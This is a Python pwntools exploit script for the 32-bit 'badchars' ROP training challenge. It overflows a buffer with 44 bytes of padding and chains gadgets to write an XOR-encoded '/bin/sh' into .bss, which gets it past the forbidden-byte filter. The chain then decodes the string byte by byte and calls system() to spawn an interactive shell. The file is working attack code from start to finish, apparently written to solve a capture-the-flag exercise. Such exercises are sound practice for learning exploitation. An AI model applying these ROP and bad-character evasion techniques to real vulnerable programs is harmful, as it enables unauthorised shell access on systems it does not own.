#!/usr/bin/python

from pwn import *

s = process('./badchars32')
s.clean()

# badchars: 0x62 0x69 0x63 0x2f 0x20 0x66 0x6e 0x73 ('bic/ fnc')

bss = 0x804a040
system = 0x080484e0

# 0x08048893 : mov dword ptr [edi], esi ; ret
# 0x08048899 : pop esi ; pop edi ; ret
# 0x08048890 : xor byte ptr [ebx], cl ; ret
# 0x08048896 : pop ebx ; pop ecx ; ret
mov_ptr_edi_esi = 0x08048893
pop_esi_pop_edi_ret = 0x08048899
xor_ptr_ebx_cl_ret = 0x08048890
pop_ebx_pop_ecx_ret = 0x08048896

#a = '/bin/sh\x00'
# ''.join(chr(2^ord(x)) for x in a)
#'-`kl-qj\x02'

write_bin_sh_to_bss = p32(pop_esi_pop_edi_ret)
write_bin_sh_to_bss += '-`kl'
write_bin_sh_to_bss += p32(bss)
write_bin_sh_to_bss += p32(mov_ptr_edi_esi)

write_bin_sh_to_bss += p32(pop_esi_pop_edi_ret)
write_bin_sh_to_bss += '-qj\x02'
write_bin_sh_to_bss += p32(bss + 4)
write_bin_sh_to_bss += p32(mov_ptr_edi_esi)

# encoding
for i in range(0,8):
    write_bin_sh_to_bss += p32(pop_ebx_pop_ecx_ret)
    write_bin_sh_to_bss += p32(bss + i)
    write_bin_sh_to_bss += p32(2)
    write_bin_sh_to_bss += p32(xor_ptr_ebx_cl_ret)


payload = 'A' * 44
payload += write_bin_sh_to_bss
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bss)

'''
context.terminal = ["terminator", "-e"]
gdb.attach(s,
"""
b * main
b * pwnme+242
""")
'''

s.sendline(payload)
s.interactive()
















